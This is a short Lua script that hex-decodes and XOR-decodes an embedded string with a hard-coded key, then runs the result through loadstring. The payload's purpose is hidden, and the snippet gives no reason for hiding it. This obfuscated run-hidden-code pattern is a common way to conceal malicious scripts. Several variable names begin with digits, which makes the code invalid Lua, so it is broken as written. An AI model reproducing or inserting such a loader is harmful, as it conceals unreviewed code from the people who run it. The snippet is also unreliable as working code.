local kv4cfunxca8 = "253d2d1e6196d27301c301e2336221b3f232218182c323a2622152c371928479331012225a44d19761b82f142932391e2c133741b8241e3a2622157336127832b49108f73fd3021b1c54153ceb4213c1a781334163a8b4213c19791e325c1512562d41191d3a37394f3f55392646162077837152a321b1e61d113c1b337017323622e273f3f"
    local function g5n63wfa0e()
      local 9hmyplus9id = ""
      for i = 1, #kv4cfunxca8, 2 do
        local byte = tonumber(kv4cfunxca8:sub(i, i + 1), 16)
        9hmyplus9id = 9hmyplus9id .. string.char(byte)
      end
      local xorKey = "secretXORKey"
      local decoded = ""
      for i = 1, #9hmyplus9id do
        decoded = decoded .. string.char(9hmyplus9id:byte(i) ~ xorKey:byte((i-1)%#xorKey+1))
      end
      return decoded
    end

    local decodedScript = loadstring(g5n63wfa0e())()
    print(decodedScript)
  